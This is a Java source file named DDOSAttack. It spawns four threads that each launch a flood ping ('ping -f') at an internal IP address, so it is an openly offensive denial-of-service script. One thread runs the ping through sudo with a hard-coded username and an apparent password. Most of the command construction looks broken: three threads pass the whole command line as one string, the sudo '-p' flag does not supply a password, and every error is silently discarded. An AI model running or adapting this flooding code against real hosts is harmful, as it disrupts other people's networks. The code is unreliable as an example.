package com.developing;

import java.io.BufferedReader;
import java.io.InputStreamReader;

public class DDOSAttack {
    public static void main(String[] args) {
        Runnable t1 = (Runnable) () -> {
            ProcessBuilder ps = new ProcessBuilder();
            ps.command("ping -f 10.20.40.234");
            try {
                Process process = ps.start();
            }catch (Exception e){}
        };
        Runnable t2 = (Runnable) () -> {
            ProcessBuilder ps = new ProcessBuilder();
            ps.command("ping -f 10.20.40.234");
            try {
                Process process = ps.start();
            }catch (Exception e){}
        };
        Runnable t3 = (Runnable) () -> {
            ProcessBuilder ps = new ProcessBuilder();
            ps.command("ping -f 10.20.40.234");
            try {
                Process process = ps.start();
            }catch (Exception e){}
        };
        Runnable t4 = (Runnable) () -> {
            ProcessBuilder ps = new ProcessBuilder();
            ps.command("sudo","-umihir","-p","Mind@123","ping","-f","10.20.40.234");
            try {
                Process process = ps.start();String line;
                BufferedReader reader = new BufferedReader(new InputStreamReader(process.getErrorStream()));
                while ((line = reader.readLine()) != null) {
                    System.out.println(line);
                }
            }catch (Exception e){}
        };
        Thread t_1 = new Thread(t1);
        Thread t_2 = new Thread(t2);
        Thread t_3 = new Thread(t3);
        Thread t_4 = new Thread(t4);
        t_1.start();
        t_2.start();
        t_3.start();
        t_4.start();
        try {
            t_1.join();
            t_2.join();
            t_3.join();
            t_4.join();
        } catch (InterruptedException e) {
            throw new RuntimeException(e);
        }
    }
}
